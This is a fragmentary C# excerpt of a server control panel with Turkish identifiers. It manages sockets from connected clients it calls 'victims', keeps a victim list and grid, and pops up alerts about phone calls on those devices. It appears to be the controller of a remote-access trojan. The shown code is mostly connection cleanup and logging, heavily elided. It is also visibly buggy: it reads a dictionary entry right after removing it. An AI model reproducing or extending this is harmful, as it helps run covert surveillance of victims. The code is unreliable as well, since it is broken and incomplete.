    ...
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        ...
        public void Client_Kabul(IAsyncResult ar)
        {
            ...
            {               
                ...
                {
                    receiveClasses.Remove(sock.Handle.ToString());
                    receiveClasses[sock.Handle.ToString()].CloseSocks();
                    try { receiveClasses[sock.Handle.ToString()].Dispose(); } catch { }
                }
        ...
        public class infoAl : IDisposable
        {
            ...
            public void CloseSocks()
            {
                if (tmp != null)
                {
                    ...
                    try { tmp.Disconnect(false); } catch (Exception) { }
                    try { tmp.Shutdown(SocketShutdown.Both); } catch (Exception) { }
                        ...
                        if (Settings.dosyaYollari("notify_call") == "1")
                        {
                            try
                            {
                                ...
                                Invoke((MethodInvoker)delegate
                                {
                                    ...
                                    new YeniArama(dt.Split('=')[1], dt.Split('=')[0], lvi.Cells[2].Value.ToString() + "@" + soket2.RemoteEndPoint.ToString(), soket2.Handle.ToString()).Show();
                                });
                            }
                            catch (Exception) { }
                        }
        ...
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Kurbanlar krbn in kurban_listesi.ToList())
            {
                ...
                catch (Exception ex)
                {
                    ...
                    try { receiveClasses[krbn.soket.Handle.ToString()].Dispose(); } catch (Exception) { }
                    try { receiveClasses.Remove(krbn.soket.Handle.ToString()); } catch (Exception) { }

                    try
                    {
                        DataGridViewRow victim = dataGridView1.Rows.Cast<DataGridViewRow>().Where(y => y.Tag.ToString() == krbn.soket.Handle.ToString()).First();
                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + krbn.soket.Handle.ToString() + " connection of this socket has closed. => " + victim.Cells[1].Value.ToString() + "/" + victim.Cells[2].Value.ToString() + " => " + ex.Message);
